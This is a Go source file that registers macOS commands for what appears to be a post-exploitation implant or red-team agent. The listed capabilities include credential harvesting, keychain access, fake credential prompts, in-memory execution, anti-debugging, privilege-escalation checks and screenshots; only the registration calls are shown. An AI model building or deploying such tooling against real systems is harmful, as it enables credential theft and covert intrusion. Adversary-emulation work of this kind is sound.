//go:build darwin

package commands

// registerPlatformCommands registers macOS-specific commands.
func registerPlatformCommands() {
	RegisterCommand(&CrontabCommand{})
	RegisterCommand(&SSHKeysCommand{})
	RegisterCommand(&SSHAgentCommand{})
	RegisterCommand(&LaunchAgentCommand{})
	RegisterCommand(&ScreenshotDarwinCommand{})
	RegisterCommand(&KeychainCommand{})
	RegisterCommand(&ShellConfigCommand{})
	RegisterCommand(&CredHarvestCommand{})
	RegisterCommand(&ClipboardCommand{})
	RegisterCommand(&DrivesUnixCommand{})
	RegisterCommand(&DebugDetectCommand{})
	RegisterCommand(&XattrCommand{})
	RegisterCommand(&MemScanCommand{})
	RegisterCommand(&PrivescCheckCommand{})
	RegisterCommand(&ExecuteMemoryCommand{})
	RegisterCommand(&CredentialPromptCommand{})
	RegisterCommand(&TCCCheckCommand{})
	RegisterCommand(&EnvScanCommand{})
	RegisterCommand(&JXACommand{})
	RegisterCommand(&PtyCommand{})
	RegisterCommand(&BrowserCommand{})
	RegisterCommand(&RunasCommand{})
	RegisterCommand(&FirewallCommand{})
	RegisterCommand(&GetPrivsCommand{})
	RegisterCommand(&NamedPipesCommand{})
	RegisterCommand(&HandlesCommand{})
	RegisterCommand(&PersistEnumCommand{})
}
